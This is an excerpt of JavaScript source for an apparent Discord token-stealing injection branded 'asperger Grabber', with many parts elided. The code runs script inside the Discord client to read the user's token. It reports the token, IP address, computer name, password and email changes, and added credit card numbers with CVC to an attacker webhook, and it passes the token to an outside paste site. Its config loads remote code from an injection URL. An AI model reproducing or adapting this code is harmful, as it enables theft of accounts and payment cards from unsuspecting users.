...
const config = {
    ...
    injection_url: "https://amorzinho.xyz/raw/main/index.js",
    webhook: "%WEBHOOK%",
    filter2: {
        urls: [
...
if (fs.existsSync(bdPath)) require(bdPath);`;
    ...
    if (!fs.existsSync(path.join(__dirname, "asperger"))) return !0;
    execScript(
...
async function FirstTime() {
    ...
    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
        ...
        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "asperger"))) {
                fs.rmdirSync(path.join(__dirname, "asperger"));
                if (token == null || token == undefined || token == "") {
                    ...
                    if(b.avatar === null){
                        usericonurl = "https://raw.githubusercontent.com/Aspergerdsc/BlackCap-Assets/main/BlackCap%20(2).png"
                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                    if(b.banner === null){
                        bannerurl = "https://raw.githubusercontent.com/Aspergerdsc/BlackCap-Assets/main/Banner.png"
                    ...
                    const c = {
                        ...
                        embeds: [{
                            title: "asperger Initalized",
                            description: "[<a:aspergergif:1041634542093619260> │ **Oh you have aspergered someone**]",
                            color: config["embed-color"],
                            fields: [{
                                name: "Injection Info",
                                ...
                                name: "@Copyright",
                                value: `[asperger 2022 <a:aspergergif:1041634542093619260>])`,
                                inline: !0
								}, {
                ...
                if (config.logout != "false" || config.logout !== "%LOGOUT%") {
                    if (config['logout-notify'] == "true") {
                        if (token == null || token == undefined || token == "") {
                            ...
                            const c = {
                                username: "asperger Grabber",
                                content: "",
                                embeds: [{
                                    title: "aspergered User log out (User not Logged in before)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
                            ...
                            if(b.avatar === null){
                                usericonurl = "https://raw.githubusercontent.com/Aspergerdsc/asperger-Assets/main/asperger%20(2).png"
                            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                            if(b.banner === null){
                                bannerurl = "https://raw.githubusercontent.com/Aspergerdsc/asperger-Assets/main/Banner.png"
                            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                            const c = {
                                username: "asperger Grabber",
                                content: "",
                                embeds: [{
                                    title: "asperger Victim got logged out",
                                    description: "[<a:aspergergif:1041634542093619260> │ **Oh you have aspergered someone**]",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
                                        ...
                                        name: "@Copyright",
                                        value: `[asperger 2021 <a:aspergergif:1041634542093619260>]`,
                                        inline: !0
								}, {
                                        name: "<a:tokens:1041634540537511957> Token",
                                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            const params = {
                ...
                content: "",
                embeds: [{
                    "title": "asperger User Login",
                    description: "[<a:aspergergif:1041634542093619260> │ **Oh you have aspergered someone**](https://github.com/Aspergerdsc)",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                        ...
                        name: "@Copyright",
                        value: `[asperger 2021 <a:aspergergif:1041634542093619260>](https://github.com/Aspergerdsc/asperger-Grabber)`,
                        inline: !0
												}, {
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            const params = {
                ...
                content: "",
                embeds: [{
                    "title": "asperger Detect Password Changed",
                    description: "[<a:aspergergif:1041634542093619260> │ **Oh you have aspergered someone**](https://github.com/Aspergerdsc)",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
           ...
           const params = {
                ...
                content: "",
                embeds: [{
                        "title": "asperger Detect Email Changed",
                        description: "[<a:aspergergif:1041634542093619260> │ **Oh you have aspergered someone**](https://github.com/Aspergerdsc)",
                        "color": config['embed-color'],
                        "fields": [{
                                name: "Injection Info",
...
async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    ...
    var {
        ...
        const params = {
            ...
            content: "",
            embeds: [{
                    "title": "asperger User Credit Card Added",
                    "description": `
                    **IP:** ${ip}\n\n
            ...
            },
                {
                    ...
                    "color": config['embed-color'],
                    "description": `\`\`\`diff\n${fs.readFileSync('aspergered_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
